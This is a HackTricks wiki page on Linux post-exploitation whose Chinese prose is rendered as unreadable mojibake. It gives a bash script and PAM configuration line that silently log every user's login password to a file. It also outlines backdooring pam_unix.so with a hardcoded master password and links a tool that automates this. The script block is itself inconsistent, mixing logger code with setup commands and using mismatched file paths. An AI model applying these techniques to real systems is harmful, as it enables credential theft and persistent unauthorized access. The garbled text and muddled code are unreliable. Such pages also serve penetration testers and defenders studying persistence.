# Linuxåæ¸—é€

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hackingï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä½¿ç”¨PAMå—…æ¢ç™»å½•å¯†ç 

è®©æˆ‘ä»¬é…ç½®ä¸€ä¸ªPAMæ¨¡å—æ¥è®°å½•æ¯ä¸ªç”¨æˆ·ç”¨äºç™»å½•çš„å¯†ç ã€‚å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯PAMï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[åŸå§‹æ–‡ç« ](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**ã€‚è¿™åªæ˜¯ä¸€ä¸ªæ‘˜è¦ï¼š

**æŠ€æœ¯æ¦‚è¿°:**
å¯æ’æ‹”è®¤è¯æ¨¡å—ï¼ˆPAMï¼‰åœ¨ç®¡ç†åŸºäºUnixçš„ç³»ç»Ÿä¸Šçš„è®¤è¯æ–¹é¢æä¾›äº†çµæ´»æ€§ã€‚å®ƒä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ç™»å½•æµç¨‹æ¥å¢å¼ºå®‰å…¨æ€§ï¼Œä½†å¦‚æœè¢«è¯¯ç”¨ä¹Ÿä¼šå¸¦æ¥é£é™©ã€‚æœ¬æ‘˜è¦æ¦‚è¿°äº†ä½¿ç”¨PAMæ•è·ç™»å½•å‡­æ®çš„æŠ€æœ¯ï¼Œä»¥åŠç¼“è§£ç­–ç•¥ã€‚

**æ•è·å‡­æ®:**
- åˆ›å»ºä¸€ä¸ªåä¸º`toomanysecrets.sh`çš„bashè„šæœ¬ï¼Œç”¨äºè®°å½•ç™»å½•å°è¯•ï¼Œæ•è·æ—¥æœŸã€ç”¨æˆ·åï¼ˆ`$PAM_USER`ï¼‰ã€å¯†ç ï¼ˆé€šè¿‡stdinè·å–ï¼‰å’Œè¿œç¨‹ä¸»æœºIPï¼ˆ`$PAM_RHOST`ï¼‰åˆ°`/var/log/toomanysecrets.log`ã€‚
- ä½¿è„šæœ¬å¯æ‰§è¡Œï¼Œå¹¶ä½¿ç”¨`pam_exec.so`æ¨¡å—å°†å…¶é›†æˆåˆ°PAMé…ç½®ï¼ˆ`common-auth`ï¼‰ä¸­ï¼Œä½¿ç”¨é€‰é¡¹é™é»˜è¿è¡Œå¹¶å°†è®¤è¯ä»¤ç‰Œæš´éœ²ç»™è„šæœ¬ã€‚
- è¯¥æ–¹æ³•æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨å—æŸçš„Linuxä¸»æœºç§˜å¯†è®°å½•å‡­æ®ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### åé—¨PAM

**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[åŸå§‹å¸–å­](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**ã€‚è¿™åªæ˜¯ä¸€ä¸ªæ‘˜è¦ï¼š

å¯æ’æ‹”è®¤è¯æ¨¡å—ï¼ˆPAMï¼‰æ˜¯Linuxä¸‹ç”¨äºç”¨æˆ·è®¤è¯çš„ç³»ç»Ÿã€‚å®ƒåŸºäºä¸‰ä¸ªä¸»è¦æ¦‚å¿µï¼š**ç”¨æˆ·å**ï¼Œ**å¯†ç **å’Œ**æœåŠ¡**ã€‚æ¯ä¸ªæœåŠ¡çš„é…ç½®æ–‡ä»¶ä½äº`/etc/pam.d/`ç›®å½•ä¸­ï¼Œå…±äº«åº“å¤„ç†è®¤è¯ã€‚

**ç›®æ ‡**ï¼šä¿®æ”¹PAMä»¥å…è®¸ä½¿ç”¨ç‰¹å®šå¯†ç è¿›è¡Œèº«ä»½éªŒè¯ï¼Œç»•è¿‡å®é™…ç”¨æˆ·å¯†ç ã€‚è¿™ä¸»è¦é›†ä¸­åœ¨`pam_unix.so`å…±äº«åº“ä¸Šï¼Œè¯¥åº“ç”±`common-auth`æ–‡ä»¶ä½¿ç”¨ï¼Œå‡ ä¹æ‰€æœ‰æœåŠ¡éƒ½ç”¨äºå¯†ç éªŒè¯ã€‚

### ä¿®æ”¹`pam_unix.so`çš„æ­¥éª¤ï¼š

1. **å®šä½`common-auth`æ–‡ä»¶ä¸­çš„è®¤è¯æŒ‡ä»¤**ï¼š
- è´Ÿè´£æ£€æŸ¥ç”¨æˆ·å¯†ç çš„è¡Œè°ƒç”¨`pam_unix.so`ã€‚
2. **ä¿®æ”¹æºä»£ç **ï¼š
- åœ¨`pam_unix_auth.c`æºæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œå¦‚æœä½¿ç”¨é¢„å®šä¹‰å¯†ç ï¼Œåˆ™æˆäºˆè®¿é—®æƒé™ï¼Œå¦åˆ™ç»§ç»­å¸¸è§„è®¤è¯è¿‡ç¨‹ã€‚
3. **é‡æ–°ç¼–è¯‘å’Œæ›¿æ¢**ä¿®æ”¹åçš„`pam_unix.so`åº“åˆ°é€‚å½“çš„ç›®å½•ã€‚
4. **æµ‹è¯•**ï¼š
- ä½¿ç”¨é¢„å®šä¹‰å¯†ç è·¨å„ç§æœåŠ¡ï¼ˆç™»å½•ã€sshã€sudoã€suã€å±å¹•ä¿æŠ¤ç¨‹åºï¼‰æˆäºˆè®¿é—®æƒé™ï¼Œè€Œæ­£å¸¸çš„è®¤è¯è¿‡ç¨‹ä¿æŒä¸å—å½±å“ã€‚

{% hint style="info" %}
æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚
{% endhint %}
